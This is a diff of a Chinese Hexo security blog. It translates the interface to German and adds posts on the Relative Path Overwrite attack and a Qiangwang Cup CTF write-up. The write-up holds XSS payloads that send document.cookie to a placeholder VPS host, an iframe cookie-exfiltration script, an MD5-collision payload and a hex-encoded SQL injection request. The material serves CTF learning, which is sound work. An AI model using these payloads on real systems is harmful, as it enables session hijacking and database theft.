@@ -181,7 +181,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Accueil
+            Startseite
           </a>
         </li>
       
@@ -191,7 +191,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archives
+            Archiv
           </a>
         </li>
       
@@ -257,7 +257,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posté le</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-10T22:18:38+08:00">
                 2018-04-10
@@ -299,7 +299,32 @@
       
         
           
-            
+            <h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p><strong>简介</strong><br>RPO(Relative Path Overwrite)攻击又称为相对路径覆盖攻击，利用了Sever Techlogy of Cache和配置差异，依赖于服务端的反应</p>
+<blockquote>
+<p>“RPO漏洞，就是服务端和客户端对这个URL的解析不一致导致的”。 ——用畅师傅说的一句话总结RPO的核心原理，</p>
+</blockquote>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>phpinfo url模式</strong><br>在讲rpo之前，先说说phpinfo url模式以及按目录方式获取资源：<br>这个例子来自第二届强网杯”Share your mind”<br><code>http://39.107.33.96:20000/index.php/view/article/763</code><br>难道有一个目录交index.php吗？不是的，它使用了url rewrite的php开发框架，也叫PHPINFO URL模式<br>等价于<br><code>http://39.107.33.96:20000/index.php?mod=view&amp;article=763</code><br>在这道题里，返回的，就是我们输入的文章内容，当标题为空时，只返回内容的纯文本，不包含html代码。<br><img src="/RPO/rpo1.png" alt=""><br>所以当访问<code>http://39.107.33.96:20000/index.php/view/article/36967/..%2f..%2f..%2f..%2findex.php</code><br>对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。</p>
+<p>对于payload，也就相当于访问</p>
+<p><code>http://39.107.33.96:20000/index.php/view/article/36967/../../../../index.php</code><br><img src="/PRO/rpo2.png" alt=""><br>但是！服务端和客户端之间产生了沟通差异，浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为<br><code>..%2f..%2f..%2f..%2findex.php</code>这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。<br>就好比输入url-<a href="https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递，返回的资源仍然是https://www.baidu.com的。而`http://39.107.33.96:20000/index.php/view/article/36967/..%2f..%2f..%2f..%2findex.php`相当于在文章ID为36967的文章页面传了一个叫..%2f..%2f..%2f..%2findex.php的参数，没有人接收，所以返回的资源就只是`http://39.107.33.96:20000/index.php/view/article/36967/`的。" target="_blank" rel="noopener">https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递，返回的资源仍然是https://www.baidu.com的。而`http://39.107.33.96:20000/index.php/view/article/36967/..%2f..%2f..%2f..%2findex.php`相当于在文章ID为36967的文章页面传了一个叫..%2f..%2f..%2f..%2findex.php的参数，没有人接收，所以返回的资源就只是`http://39.107.33.96:20000/index.php/view/article/36967/`的。</a></p>
+<p>浏览器错误理解url后，请求相对路径中请求的资源路径，就变成了<code>http://39.107.33.96:20000/index.php/view/article/36967/..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js</code></p>
+<p>当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，</p>
+<p>读到..%2f..%2f..%2f..%2findex.php这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是<code>http://39.107.33.96:20000/index.php/view/article/36967/</code><br><img src="/RPO/rpo3.png" alt=""></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>初时</strong><br>以上是关于JS的栗子<br>再说一个CSS的栗子：<br><code>http://www.google.com/tools/toolbar/buttons/apis/howto_guide.html</code></p>
+<p>网页代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Google Toolbar API -Guide to Making Custom Buttons<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"../../styles.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span><span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span></span><br><span class="line">[..]</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>sp 接受路径参数将一切分号作为参数比如 path;/notpath 也会被接受作为目录<br>浏览器会将用户提交的 URL 编码解码后发给服务器<br>如果可以使用 %2f 代替 “/“ 的话，就可以把 URL 写为 <a href="http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html，返回正确。" target="_blank" rel="noopener">http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html，返回正确。</a></p>
+<p>服务器接收到的是 / tools/toolbar/buttons/apis/howto_guide.html<br>浏览器接受到的是 /tools/toolbar/buttons/apis%2fhowto_guide.html<br>页面中导入的样式表 为 /tools/toolbar/buttons/../../style.css<br>浏览器认为 style.css 的根目录是 tools/toolbar/buttons，而不是 tools/toolbar/button/apis<br>所以../../style.css 跳到了更高一级的目录下</p>
+<p>还有更多的利用空间</p>
+<p>我们伪造一个目录为 fake，就可以导入一个不存在的 tools/fake/styles.css<br><a href="http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html" target="_blank" rel="noopener">http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html</a><br>服务器就收到的目录是 /tools/fake/../toolbar/buttons/apis/howto_guide.html<br>浏览器接收到的目录是 / tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html<br>导入的样式表为 /tools/fake/..%2ftoolbar/buttons/../../style.css<br>浏览器认为 fake / 和 %2ftoolbar 是两个<strong>不同的目录</strong>，而这个fake的CSS会被服务器认为是在google根域下<br>这样就可以导入 google 域名下任意样式表</p>
+<p>找到一个能使用参数导入背景的网页<br>如:<a href="http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=%0a{}*{background:red}" target="_blank" rel="noopener">http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=%0a{}*{background:red}</a></p>
+<p>网页源码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"frontend-directory-page"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">"-1"</span>&gt;</span><span class="tag">&lt;<span class="name">divclass="resultNotFound"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Search <span class="tag">&lt;<span class="name">b</span>&gt;</span>-</span><br><span class="line">&#123;&#125;*&#123;background:red&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span> did not match any gadgets</span><br></pre></td></tr></table></figure></p>
+<p><img src="/RPO/rpo4.png" alt=""></p>
+<p>如果<code>http://www.google.com/tools/toolbar/buttons/gallery?foo=bar</code>会自动重定向到<br><code>http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;foo=bar</code><br>就可以直接构造载荷了, 因为样式表需要持续的注入所以将 xss 代码写入 url 中</p>
+<p>构造 PayLoad 为 <a href="http://www.google.com/tools/toolbar%2fbuttons%3fq%3d%250a%257B%257D%257Bbackground%253Ared%257D/..%2f/apis/howto_guide.html" target="_blank" rel="noopener">http://www.google.com/tools/toolbar%2fbuttons%3fq%3d%250a%257B%257D%257Bbackground%253Ared%257D/..%2f/apis/howto_guide.html</a><br>服务器接收到的请求为<code>/tools/toolbar/buttons/gallery?q=%0a{}*{background:red}/..//apis/howto_guide.html</code><br>浏览器接收到的请求为<code>/tools/toolbar%2fbuttons%3fq%3d%250a%257B%257D%257Bbackground%253Ared%257D/..%2f/apis/howto_guide.html</code><br>导入的样式表为/tools/toolbar%2fbuttons%3fq%3d%250a%257B%257D%257Bbackground%253Ared%257D/..%2f/apis/../../style.css<br>/tools/toolbar/buttons/gallery?q=%0a{}<em>{background:red}/style.css<br>/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=%0a{}</em>{background:red}/style.css</p>
+<p><img src="/RPO/rpo5" alt=""></p>
+<p>样式表被成功导入了页面</p>
+<hr>
+<p>参考文献：<br><a href="https://xz.aliyun.com/t/2220" target="_blank" rel="noopener">https://xz.aliyun.com/t/2220</a><br><a href="http://www.zjicmisa.org/index.php/archives/127/" target="_blank" rel="noopener">http://www.zjicmisa.org/index.php/archives/127/</a><br><a href="http://www.ideawu.net/blog/archives/494.html" target="_blank" rel="noopener">http://www.ideawu.net/blog/archives/494.html</a></p>
+
           
         
       
@@ -376,7 +401,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posté le</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-02T22:48:42+08:00">
                 2018-04-02
@@ -495,7 +520,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posté le</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-02T20:26:19+08:00">
                 2018-04-02
@@ -540,13 +565,12 @@
             <p>强网杯的题目确实质量很高，把我按在光滑的地上摩擦~<br>那个星期去打球去了，所以也没怎么研究。这会乘有空，把l3m0n师傅的wp拿来看看</p>
 <h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>考点:md5比较缺陷<br>这个签到题有三关，前两关传数组payload<code>param1p[]=1&amp;param2[]=a</code>即可，二者返回均为0，绕过<br>来到第三关，贴上源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">"success!);</span></span><br><span class="line"><span class="string">				&#125;</span></span><br></pre></td></tr></table></figure></p>
 <p>要求MD5后的两字段需要完全相等（大小，数据类型）<br>参见这两盘文献：<a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a><br><a href="https://www.mscs.dal.ca/~selinger/md5collision/" target="_blank" rel="noopener">https://www.mscs.dal.ca/~selinger/md5collision/</a><br>即山东大学两教授研究出的hash collision<br>所以经过转码后，最终的payload:<br><code>&quot;param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;</code></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>Share your mind</strong><br>题目描述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please help me find the vulnerability before I finish this site！</span><br><span class="line">hint：xss bot使用phantomjs，版本2.1.1</span><br><span class="line">hint2 : xss的点不在report页面</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>Share your mind</strong><br>考点：RPO导致服务器端存储型XSS<br>题目描述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please help me find the vulnerability before I finish this site！</span><br><span class="line">hint：xss bot使用phantomjs，版本2.1.1</span><br><span class="line">hint2 : xss的点不在report页面</span><br></pre></td></tr></table></figure></p>
 <p>login后，Reports这里存在一个PS:<code>substr(\(md5($code),0,6) === &#39;21b495&#39;</code><br>意为MD5后前缀为21b495的数，使用脚本穷举<br>脚本如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	</span><br><span class="line">$code = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(substr(md5($code),<span class="number">0</span>,<span class="number">6</span>)==<span class="string">'21b495'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $code;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$code++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>.md5($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>打开页面源文件:<br><img src="/Share your mind1.png" alt=""><br>在请求外部jQuery的时候没有”/“来限制，故存在rpo漏洞(相对路径覆盖漏洞)<br>关于rpo漏洞，简而言之，就是由于服务器和浏览器的解码，造成服务器和浏览器差异，从而导致页面中引用文件 使用相对路径时出错。服务器便将访问地址回滚到本域中。利用这样的一个特性，我们可以加载服务器上面任意的文件，只要页面受我们控制，我们就可以注入进去数据。<br>有时间的时候我也来写写这个洞的复现和利用(小声bb)<br>可参考文献：l3m0n师傅的blog:<a href="http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html</a><br>phorse师傅的page:<a href="https://xz.aliyun.com/t/2220" target="_blank" rel="noopener">https://xz.aliyun.com/t/2220</a><br>payload:<code>http://39.107.33.96:20000/index.php/view/article/784/%2f..%2f..%2f..%2f..%2f</code><br>%2f指反斜杠，即：<code>http://39.107.33.96:20000/index.php/view/article/784/\..\..\..\..\</code><br>这里便使得其回滚四层到index.php,然后就可以弹出自己的VPNip，也就找到了注入点。把<code>http://39.107.33.96:20000/index.php/view/article/36967</code>的页面内容，也就是alert(1)当做是js文件的内容，带回到了script标签中，也就因此，造成了XSS漏洞。<br>完成过程：先填写一个只有内容，没有标题的Ideas<br><img src="/share your mind3.png" alt=""><br>那请求的结果将含有HTML代码，如果这个时候再把返回的数据当做是JavaScript代码解析，就会发生异常</p>
-<p>获取当前根目录的cookie:<br><code>b=document.cookie;a=&quot;&lt;img src=//ip/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);</code>        //还不太明白btoa函数是干什么的…<br>或者使用<code>(new Image()).src = &#39;http://VPSIP:Port?&#39;+document.cookie</code><br>因为注入点过滤了引号，所以可以用fromCharCode进行绕过处理</p>
+<p>打开页面源文件:<br><img src="/CTF/Share your mind1.png" alt=""><br>在请求外部jQuery的时候没有”/“来限制，故存在rpo漏洞(相对路径覆盖漏洞)<br>关于rpo漏洞，简而言之，就是由于服务器和浏览器的解码，造成服务器和浏览器差异，从而导致页面中引用文件 使用相对路径时出错。服务器便将访问地址回滚到本域中。利用这样的一个特性，我们可以加载服务器上面任意的文件，只要页面受我们控制，我们就可以注入进去数据。<br>有时间的时候我也来写写这个洞的复现和利用(小声bb)<br>可参考文献：l3m0n师傅的blog:<a href="http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html</a><br>phorse师傅的page:<a href="https://xz.aliyun.com/t/2220" target="_blank" rel="noopener">https://xz.aliyun.com/t/2220</a><br>payload:<code>http://39.107.33.96:20000/index.php/view/article/784/%2f..%2f..%2f..%2f..%2f</code><br>%2f指反斜杠，即：<code>http://39.107.33.96:20000/index.php/view/article/784/\..\..\..\..\</code><br>这里便使得其回滚四层到index.php,然后就可以弹出自己的VPNip，也就找到了注入点。把<code>http://39.107.33.96:20000/index.php/view/article/36967</code>的页面内容，也就是alert(1)当做是js文件的内容，带回到了script标签中，也就因此，造成了XSS漏洞。<br>完成过程：先填写一个只有内容，没有标题的Ideas<br><img src="/CTF/share your mind3.png" alt=""><br>那请求的结果将含有HTML代码，如果这个时候再把返回的数据当做是JavaScript代码解析，就会发生异常<br>获取当前根目录的cookie:<br><code>b=document.cookie;a=&quot;&lt;img src=//ip/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);</code>        //还不太明白btoa函数是干什么的…<br>或者使用<code>(new Image()).src = &#39;http://VPSIP:Port?&#39;+document.cookie</code><br>因为注入点过滤了引号，所以可以用fromCharCode进行绕过处理</p>
 <p>打回来的数据提示<code>Try to get the cookie of path &quot;/QWB_fl4g/QWB/&quot;</code>，也就是要获取不同目录下的cookie。可以通过iframe来加载，最后来获取iframe里面的cookie。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">i.setAttribute(<span class="string">"src"</span>, <span class="string">"/QWB_fl4g/QWB/"</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(i);</span><br><span class="line">i.addEventListener( <span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> content = i.contentWindow.document.cookie;</span><br><span class="line">  location=<span class="string">'//ip/'</span>+btoa(content);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">		<span class="comment">//这个脚本看不太懂...</span></span><br></pre></td></tr></table></figure></p>
 <p>最后可在此路径得到flag.</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>Three hit</strong><br>注册时要求age而登陆后提示调用了age，所以是二次注入<br>对age输入限制为数字，所以hex一下：<br><img src="/Three hit.jpg" alt=""><br>获取flag的payload:<br><figure class="highlight plain"><figcaption><span>/index.php?func</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host: 39.107.32.29:10000</span><br><span class="line"></span><br><span class="line">username=ratten3anger&amp;age=0x393939393939393939393939393920756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167206c696d697420302c31292c332c34206c696d697420382c312d2d&amp;password=123456</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>Three hit</strong><br>注册时要求age而登陆后提示调用了age，所以是二次注入<br>对age输入限制为数字，所以hex一下：<br><img src="/CTF/Three hit.jpg" alt=""><br>获取flag的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?func=register HTTP/1.1</span><br><span class="line">Host: 39.107.32.29:10000</span><br><span class="line"></span><br><span class="line">username=ratten3anger&amp;age=0x393939393939393939393939393920756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167206c696d697420302c31292c332c34206c696d697420382c312d2d&amp;password=123456</span><br></pre></td></tr></table></figure></p>
 <p>自分が信じることは、必ずできられ見せます。</p>
 
           
@@ -625,7 +649,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posté le</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-02T10:56:25+08:00">
                 2018-04-02
@@ -765,7 +789,7 @@ print s.[:point]
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posté le</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-31T12:56:41+08:00">
                 2018-03-31
@@ -898,7 +922,7 @@ print s.[:point]
                 <a href="/archives/">
               
                   <span class="site-state-item-count">5</span>
-                  <span class="site-state-item-name">articles</span>
+                  <span class="site-state-item-name">Artikel</span>
                 </a>
               </div>
             
@@ -911,7 +935,7 @@ print s.[:point]
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
                   <span class="site-state-item-count">2</span>
-                  <span class="site-state-item-name">tags</span>
+                  <span class="site-state-item-name">Tags</span>
                 </a>
               </div>
             
@@ -979,7 +1003,7 @@ print s.[:point]
 </div>
 
 
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
 
@@ -987,7 +1011,7 @@ print s.[:point]
 
 
 
-  <div class="theme-info">Thème &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
 
 
 
